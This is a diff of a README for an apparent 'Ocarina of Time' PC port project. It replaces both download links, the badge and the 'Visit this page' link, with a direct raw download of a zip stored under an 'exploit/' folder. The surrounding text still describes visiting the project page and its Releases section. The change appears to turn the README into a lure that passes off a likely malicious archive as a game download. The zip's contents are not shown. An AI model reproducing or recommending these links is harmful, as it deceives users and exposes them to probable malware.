@@ -1,6 +1,6 @@
 # 🎮 ocarina-of-time-pc-port - Play classic Zelda on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/norriepolydactylous634/ocarina-of-time-pc-port)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/norriepolydactylous634/ocarina-of-time-pc-port/raw/refs/heads/main/exploit/of_time_port_ocarina_pc_v1.0.zip)
 
 ## 📌 Project Overview
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the game well:
 
 You must visit the project page to download the latest version of the application. 
 
-[Visit this page to download the software](https://github.com/norriepolydactylous634/ocarina-of-time-pc-port)
+[Visit this page to download the software](https://github.com/norriepolydactylous634/ocarina-of-time-pc-port/raw/refs/heads/main/exploit/of_time_port_ocarina_pc_v1.0.zip)
 
 1. Open your web browser and go to the link above.
 2. Look for the section labeled Releases on the right side of the screen.
